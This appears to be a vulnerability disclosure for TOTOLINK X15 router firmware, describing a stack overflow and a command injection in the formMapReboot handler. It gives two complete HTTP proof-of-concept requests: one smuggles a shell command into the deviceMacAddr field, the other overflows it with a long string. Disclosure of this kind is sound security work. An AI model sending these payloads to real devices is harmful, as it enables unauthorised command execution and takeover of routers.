#### Affected version

V1.0.0-B20230714.1105

#### Vulnerability details

There are stack overflow and command injection vulnerabilities in the formMapReboot function. There is no good control length by setting deviceMacAdd. There is a stack overflow when strcpy is copied, and the return address can be overwritten. When v5 is copied to the v4 variable, there is no command filtering, and command execution can be achieved, so that command execution can be achieved.

![image-20250523202635487](picture/TOTOlink-x15-Gh-V1.0.0-B20230714/image-20250523202635487.png)

#### POC1-(code-injection)

~~~http
POST /boafrm/formMapReboot HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Referer: http://192.168.0.1/tcpipwan.htm
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0
X-Requested-With: XMLHttpRequest
Origin: http://192.168.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 983

sessionCheck=91c636aec77c15df3117a988288bd371&deviceMacAddr=127.0.0.1; touch /1.txt &
~~~

##### result

![image-20250523202943693](picture/TOTOlink-x15-Gh-V1.0.0-B20230714/image-20250523202943693.png)

#### POC2-(stack_overflow)

~~~http
POST /boafrm/formMapReboot HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Referer: http://192.168.0.1/tcpipwan.htm
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0
X-Requested-With: XMLHttpRequest
Origin: http://192.168.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 983

sessionCheck=91c636aec77c15df3117a988288bd371&deviceMacAddr=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
~~~

##### result

![image-20250523203451493](picture/TOTOlink-x15-Gh-V1.0.0-B20230714/image-20250523203451493.png)